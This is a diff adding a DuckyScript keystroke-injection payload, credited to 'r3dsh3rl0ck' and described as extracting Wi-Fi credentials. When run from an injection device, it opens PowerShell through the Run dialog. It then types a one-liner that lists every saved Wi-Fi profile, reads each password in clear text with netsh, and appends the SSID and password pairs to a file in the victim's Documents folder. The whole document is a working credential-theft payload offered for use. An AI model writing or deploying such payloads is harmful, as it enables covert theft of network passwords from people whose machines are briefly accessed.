@@ -1,0 +1,13 @@
+REM Author: r3dsh3rl0ck
+REM Description: Script to extract Wi-Fi credentials
+DELAY 500
+GUI r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 1000
+STRING (netsh wlan show profiles) -match "All User Profile" | ForEach-Object { $ssid = ($_ -split ':')[1].Trim(); $password = (netsh wlan show profile name=$ssid key=clear | Select-String "Key Content").Line -split ': ' | Select -Last 1; "`n======================================`nSSID: $ssid`nPassword: $password`n======================================" | Out-File -Append -FilePath $env:USERPROFILE\Documents\wifi-credentials.txt }
+ENTER
+DELAY 1000
+STRING exit
+ENTER
